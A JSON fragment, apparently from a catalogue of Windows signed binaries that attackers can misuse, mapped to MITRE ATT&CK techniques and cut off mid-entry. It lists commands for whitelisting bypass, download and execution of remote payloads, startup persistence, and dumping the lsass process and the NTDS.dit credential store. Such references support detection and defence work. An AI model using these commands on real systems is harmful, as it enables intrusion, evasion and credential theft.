"function": "awl-bypass", "data": [{"Command": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty", "Description": "Bypass AWL solutions by copying and executing cscript.exe and malicious XSL documents from attacker controlled location", "Usecase": "Execute aribtrary, unsigned code via XSL script", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1104": {"platform": "windows", "cmd": "CL_Invocation.ps1", "cmd_alias": "CL_Invocation", "cmd_desc": "Aero diagnostics script", "function": "execute", "data": [{"Command": ". C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args]", "Description": "Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1105": {"platform": "windows", "cmd": "CL_Mutexverifiers.ps1", "cmd_alias": "CL_Mutexverifiers", "cmd_desc": null, "function": "execute", "data": [{"Command": ". C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1", "Description": "Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1106": {"platform": "windows", "cmd": "ntdsutil.exe", "cmd_alias": "ntdsutil", "cmd_desc": "Command line utility used to export Actove Directory.", "function": "dump", "data": [{"Command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q", "Description": "Dump NTDS.dit into folder", "Usecase": "Dumping of Active Directory NTDS.dit database", "Category": "Dump", "Privileges": "Administrator", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows"}]}, "1107": {"platform": "windows", "cmd": "Cdb.exe", "cmd_alias": "Cdb", "cmd_desc": "Debugging tool included with Windows Debugging Tools.", "function": "execute", "data": [{"Command": "cdb.exe -cf x64_calc.wds -o notepad.exe", "Description": "Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.", "Usecase": "Local execution of assembly shellcode.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1108": {"platform": "windows", "cmd": "te.exe", "cmd_alias": "te", "cmd_desc": "Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).", "function": "execute", "data": [{"Command": "te.exe bypass.wsc", "Description": "Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.", "Usecase": "Execute Visual Basic script stored in local Windows Script Component file.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1109": {"platform": "windows", "cmd": "Powerpnt.exe", "cmd_alias": "Powerpnt", "cmd_desc": "Microsoft Office binary.", "function": "download", "data": [{"Command": "Powerpnt.exe \"http://192.168.1.10/TeamsAddinLoader.dll\"", "Description": "Downloads payload from remote server", "Usecase": "It will download a remote payload and place it in the cache folder", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows"}]}, "1110": {"platform": "windows", "cmd": "rcsi.exe", "cmd_alias": "rcsi", "cmd_desc": "Non-Interactive command line inerface included with Visual Studio.", "function": "execute", "data": [{"Command": "rcsi.exe bypass.csx", "Description": "Use embedded C# within the csx script to execute the code.", "Usecase": "Local execution of arbitrary C# code stored in local CSX file.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1111": {"platform": "windows", "cmd": "rcsi.exe", "cmd_alias": "rcsi", "cmd_desc": "Non-Interactive command line inerface included with Visual Studio.", "function": "awl-bypass", "data": [{"Command": "rcsi.exe bypass.csx", "Description": "Use embedded C# within the csx script to execute the code.", "Usecase": "Local execution of arbitrary C# code stored in local CSX file.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1112": {"platform": "windows", "cmd": "Update.exe", "cmd_alias": "Update", "cmd_desc": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.", "function": "download", "data": [{"Command": "Update.exe --download [url to package]", "Description": "The above binary will go to url and look for RELEASES file and download the nuget package.", "Usecase": "Download binary", "Category": "Download", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}]}, "1113": {"platform": "windows", "cmd": "Update.exe", "cmd_alias": "Update", "cmd_desc": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.", "function": "awl-bypass", "data": [{"Command": "Update.exe --update=[url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --update=\\\\remoteserver\\payloadFolder", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "Usecase": "Download and execute binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --updateRollback=[url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --processStart payload.exe --process-start-args \"whatever args\"", "Description": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.", "Usecase": "Application Whitelisting Bypass", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --updateRollback=\\\\remoteserver\\payloadFolder", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "Usecase": "Download and execute binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}]}, "1114": {"platform": "windows", "cmd": "Update.exe", "cmd_alias": "Update", "cmd_desc": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.", "function": "execute", "data": [{"Command": "Update.exe --update=[url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --update=\\\\remoteserver\\payloadFolder", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "Usecase": "Download and execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --updateRollback=[url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --updateRollback=\\\\remoteserver\\payloadFolder", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "Usecase": "Download and execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --processStart payload.exe --process-start-args \"whatever args\"", "Description": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.", "Usecase": "Execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --createShortcut=payload.exe -l=Startup", "Description": "Copy your payload into \"%localappdata%\\Microsoft\\Teams\\current\\\". Then run the command. Update.exe will create a payload.exe shortcut in \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\". Then payload will run on every login of the user who runs it.", "Usecase": "Execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1547", "MitreLink": "https://attack.mitre.org/techniques/T1547/001/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "Update.exe --removeShortcut=payload.exe -l=Startup", "Description": "Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page.", "Usecase": "Execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1070", "MitreLink": "https://attack.mitre.org/techniques/T1070/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}]}, "1115": {"platform": "windows", "cmd": "csi.exe", "cmd_alias": "csi", "cmd_desc": "Command line interface included with Visual Studio.", "function": "execute", "data": [{"Command": "csi.exe file", "Description": "Use csi.exe to run unsigned C# code.", "Usecase": "Local execution of unsigned C# code.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1116": {"platform": "windows", "cmd": "Mftrace.exe", "cmd_alias": "Mftrace", "cmd_desc": "Trace log generation tool for Media Foundation Tools.", "function": "execute", "data": [{"Command": "Mftrace.exe cmd.exe", "Description": "Launch cmd.exe as a subprocess of Mftrace.exe.", "Usecase": "Local execution of cmd.exe as a subprocess of Mftrace.exe.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "Mftrace.exe powershell.exe", "Description": "Launch cmd.exe as a subprocess of Mftrace.exe.", "Usecase": "Local execution of powershell.exe as a subprocess of Mftrace.exe.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1117": {"platform": "windows", "cmd": "Tracker.exe", "cmd_alias": "Tracker", "cmd_desc": "Tool included with Microsoft .Net Framework.", "function": "execute", "data": [{"Command": "Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe", "Description": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.", "Usecase": "Injection of locally stored DLL file into target process.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1118": {"platform": "windows", "cmd": "Tracker.exe", "cmd_alias": "Tracker", "cmd_desc": "Tool included with Microsoft .Net Framework.", "function": "awl-bypass", "data": [{"Command": "Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe", "Description": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.", "Usecase": "Injection of locally stored DLL file into target process.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1119": {"platform": "windows", "cmd": "msxsl.exe", "cmd_alias": "msxsl", "cmd_desc": "Command line utility used to perform XSL transformations.", "function": "execute", "data": [{"Command": "msxsl.exe customers.xml script.xsl", "Description": "Run COM Scriptlet code within the script.xsl file (local).", "Usecase": "Local execution of script stored in XSL file.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml", "Description": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).", "Usecase": "Local execution of remote script stored in XSL script stored as an XML file.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1120": {"platform": "windows", "cmd": "msxsl.exe", "cmd_alias": "msxsl", "cmd_desc": "Command line utility used to perform XSL transformations.", "function": "awl-bypass", "data": [{"Command": "msxsl.exe customers.xml script.xsl", "Description": "Run COM Scriptlet code within the script.xsl file (local).", "Usecase": "Local execution of script stored in XSL file.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml", "Description": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).", "Usecase": "Local execution of remote script stored in XSL script stored as an XML file.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1121": {"platform": "windows", "cmd": "SQLToolsPS.exe", "cmd_alias": "SQLToolsPS", "cmd_desc": "Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.", "function": "execute", "data": [{"Command": "SQLToolsPS.exe -noprofile -command Start-Process calc.exe", "Description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.", "Usecase": "Execute PowerShell command.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1122": {"platform": "windows", "cmd": "Sqlps.exe", "cmd_alias": "Sqlps", "cmd_desc": "Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.", "function": "execute", "data": [{"Command": "Sqlps.exe -noprofile", "Description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.", "Usecase": "Execute PowerShell commands without ScriptBlock logging.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1123": {"platform": "windows", "cmd": "Dxcap.exe", "cmd_alias": "Dxcap", "cmd_desc": "DirectX diagnostics/debugger included with Visual Studio.", "function": "execute", "data": [{"Command": "Dxcap.exe -c C:\\Windows\\System32\\notepad.exe", "Description": "Launch notepad as a subprocess of Dxcap.exe", "Usecase": "Local execution of a process as a subprocess of Dxcap.exe", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1124": {"platform": "windows", "cmd": "Appvlp.exe", "cmd_alias": "Appvlp", "cmd_desc": "Application Virtualization Utility Included with Microsoft Office 2016", "function": "execute", "data": [{"Command": "AppVLP.exe \\\\webdav\\calc.bat", "Usecase": "Execution of BAT file hosted on Webdav server.", "Description": "Executes calc.bat through AppVLP.exe", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 w/Office 2016"}, {"Command": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)\"", "Usecase": "Local execution of process bypassing Attack Surface Reduction (ASR).", "Description": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 w/Office 2016"}, {"Command": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\\\webdav\\xll_poc.xll')\"", "Usecase": "Local execution of process bypassing Attack Surface Reduction (ASR).", "Description": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 w/Office 2016"}]}, "1125": {"platform": "windows", "cmd": "DefaultPack.EXE", "cmd_alias": "DefaultPack", "cmd_desc": "This binary can be downloaded along side multiple software downloads on the microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.", "function": "execute", "data": [{"Command": "DefaultPack.EXE /C:\"process.exe args\"", "Description": "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.", "Usecase": "Can be used to execute stagers, binaries, and other malicious commands.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows"}]}, "1126": {"platform": "windows", "cmd": "dnx.exe", "cmd_alias": "dnx", "cmd_desc": ".Net Execution environment file included with .Net.", "function": "execute", "data": [{"Command": "dnx.exe consoleapp", "Description": "Execute C# code located in the consoleapp folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies)", "Usecase": "Local execution of C# project stored in consoleapp folder.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1127": {"platform": "windows", "cmd": "Bginfo.exe", "cmd_alias": "Bginfo", "cmd_desc": "Background Information Utility included with SysInternals Suite", "function": "execute", "data": [{"Command": "bginfo.exe bginfo.bgi /popup /nolicprompt", "Description": "Execute VBscript code that is referenced within the bginfo.bgi file.", "Usecase": "Local execution of VBScript", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt", "Usecase": "Remote execution of VBScript", "Description": "Execute bginfo.exe from a WebDAV server.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt", "Usecase": "Remote execution of VBScript", "Description": "This style of execution may not longer work due to patch.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1128": {"platform": "windows", "cmd": "Bginfo.exe", "cmd_alias": "Bginfo", "cmd_desc": "Background Information Utility included with SysInternals Suite", "function": "awl-bypass", "data": [{"Command": "bginfo.exe bginfo.bgi /popup /nolicprompt", "Description": "Execute VBscript code that is referenced within the bginfo.bgi file.", "Usecase": "Local execution of VBScript", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt", "Usecase": "Remote execution of VBScript", "Description": "Execute bginfo.exe from a WebDAV server.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}, {"Command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt", "Usecase": "Remote execution of VBScript", "Description": "This style of execution may not longer work due to patch.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1129": {"platform": "windows", "cmd": "Msdeploy.exe", "cmd_alias": "Msdeploy", "cmd_desc": "Microsoft tool used to deploy Web Applications.", "function": "execute", "data": [{"Command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"c:\\temp\\calc.bat\"", "Description": "Launch calc.bat via msdeploy.exe.", "Usecase": "Local execution of batch file using msdeploy.exe.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows server"}]}, "1130": {"platform": "windows", "cmd": "Msdeploy.exe", "cmd_alias": "Msdeploy", "cmd_desc": "Microsoft tool used to deploy Web Applications.", "function": "awl-bypass", "data": [{"Command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"c:\\temp\\calc.bat\"", "Description": "Launch calc.bat via msdeploy.exe.", "Usecase": "Local execution of batch file using msdeploy.exe.", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows server"}]}, "1131": {"platform": "windows", "cmd": "adplus.exe", "cmd_alias": "adplus", "cmd_desc": "Debugging tool included with Windows Debugging Tools", "function": "dump", "data": [{"Command": "adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet", "Description": "Creates a memory dump of the lsass process", "Usecase": "Create memory dump and parse it offline", "Category": "Dump", "Privileges": "SYSTEM", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/techniques/T1003/", "OperatingSystem": "All Windows"}]}, "1132": {"platform": "windows", "cmd": "Sqldumper.exe", "cmd_alias": "Sqldumper", "cmd_desc": "Debugging utility included with Microsoft SQL.", "function": "dump", "data": [{"Command": "sqldumper.exe 464 0 0x0110", "Description": "Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).", "Usecase": "Dump process using PID.", "Category": "Dump", "Privileges": "Administrator", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows"}, {"Command": "sqldumper.exe 540 0 0x01100:40", "Description": "0x01100:40 flag will create a Mimikatz compatible dump file.", "Usecase": "Dump LSASS.exe to Mimikatz compatible dump using PID.", "Category": "Dump", "Privileges": "Administrator", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows"}]}, "1133": {"platform": "windows", "cmd": "vsjitdebugger.exe", "cmd_alias": "vsjitdebugger", "cmd_desc": "Just-In-Time (JIT) debugger included with Visual Studio", "function": "execute", "data": [{"Command": "Vsjitdebugger.exe calc.exe", "Description": "Executes calc.exe as a subprocess of Vsjitdebugger.exe.", "Usecase": "Execution of local PE file as a subprocess of Vsjitdebugger.exe.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows"}]}, "1134": {"platform": "windows", "cmd": "AgentExecutor.exe", "cmd_alias": "AgentExecutor", "cmd_desc": "Intune Management Extension included on Intune Managed Devices", "function": "execute", "data": [{"Command": "AgentExecutor.exe -powershell \"c:\\temp\\malicious.ps1\" \"c:\\temp\\test.log\" \"c:\\temp\\test1.log\" \"c:\\temp\\test2.log\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1", "Description": "Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument", "Usecase": "Execute unsigned powershell scripts", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}, {"Command": "AgentExecutor.exe -powershell \"c:\\temp\\malicious.ps1\" \"c:\\temp\\test.log\" \"c:\\temp\\test1.log\" \"c:\\temp\\test2.log\" 60000 \"C:\\temp\\\" 0 1", "Description": "If we place a binary named powershell.exe in the path c:\\temp, agentexecutor.exe will execute it successfully", "Usecase": "Execute a provided EXE", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}]}, "1135": {"platform": "windows", "cmd": "Squirrel.exe", "cmd_alias": "Squirrel", "cmd_desc": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.", "function": "download", "data": [{"Command": "squirrel.exe --download [url to package]", "Description": "The above binary will go to url and look for RELEASES file and download the nuget package.", "Usecase": "Download binary", "Category": "Download", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}]}, "1136": {"platform": "windows", "cmd": "Squirrel.exe", "cmd_alias": "Squirrel", "cmd_desc": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.", "function": "awl-bypass", "data": [{"Command": "squirrel.exe --update [url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "squirrel.exe --updateRoolback=[url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}]}, "1137": {"platform": "windows", "cmd": "Squirrel.exe", "cmd_alias": "Squirrel", "cmd_desc": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.", "function": "execute", "data": [{"Command": "squirrel.exe --update [url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}, {"Command": "squirrel.exe --updateRollback=[url to package]", "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "Usecase": "Download and execute binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/techniques/T1218/", "OperatingSystem": "Windows 7 and up with Microsoft Teams installed"}]}, "1138": {"platform": "windows", "cmd": "Remote.exe", "cmd_alias": "Remote", "cmd_desc": "Debugging tool included with Windows Debugging Tools", "function": "awl-bypass", "data": [{"Command": "Remote.exe /s \"powershell.exe\" anythinghere", "Description": "Spawns powershell as a child process of remote.exe", "Usecase": "Executes a process under a trusted Microsoft signed binary", "Category": "AWL Bypass", "Privileges": "User", "MitreID": null, "MitreLink": null, "OperatingSystem": null}]}, "1139": {"platform": "windows", "cmd": "Remote.exe", "cmd_alias": "Remote", "cmd_desc": "Debugging tool included with Windows Debugging Tools", "function": "execute", "data": [{"Command": "Remote.exe /s \"powershell.exe\" anythinghere", "Description": "Spawns powershell as a child process of remote.exe", "Usecase": "Executes a process under a trusted Microsoft signed binary", "Category": "Execute", "Privileges": "User", "MitreID": null, "MitreLink": null, "OperatingSystem": null}, {"Command": "Remote.exe /s \"\\\\10.10.10.30\\binaries\\file.exe\" anythinghere", "Description": "Run a remote file", "Usecase": "Executing a remote binary without saving file to disk", "Category": "Execute", "Privileges": "User", "MitreID": null, "MitreLink": null, "OperatingSystem": null}]}, "1140": {"platform": "windows", "cmd": "Dotnet.exe", "cmd_alias": "Dotnet", "cmd_desc": "dotnet.exe comes with .NET Framework", "function": "awl-bypass", "data": [{"Command": "dotnet.exe [PATH_TO_DLL]", "Description": "dotnet.exe will execute any dll even if applocker is enabled.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 7 and up with .NET installed"}, {"Command": "dotnet.exe msbuild [Path_TO_XML_CSPROJ]", "Description": "dotnet.exe with msbuild (SDK Version) will execute unsigned code", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 with .NET Core installed"}]}, "1141": {"platform": "windows", "cmd": "Dotnet.exe", "cmd_alias": "Dotnet", "cmd_desc": "dotnet.exe comes with .NET Framework", "function": "execute", "data": [{"Command": "dotnet.exe [PATH_TO_DLL]", "Description": "dotnet.exe will execute any DLL.", "Usecase": "Execute DLL", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 7 and up with .NET installed"}]}, "1142": {"platform": "windows", "cmd": "Wsl.exe", "cmd_alias": "Wsl", "cmd_desc": "Windows subsystem for Linux executable", "function": "execute", "data": [{"Command": "wsl.exe -e 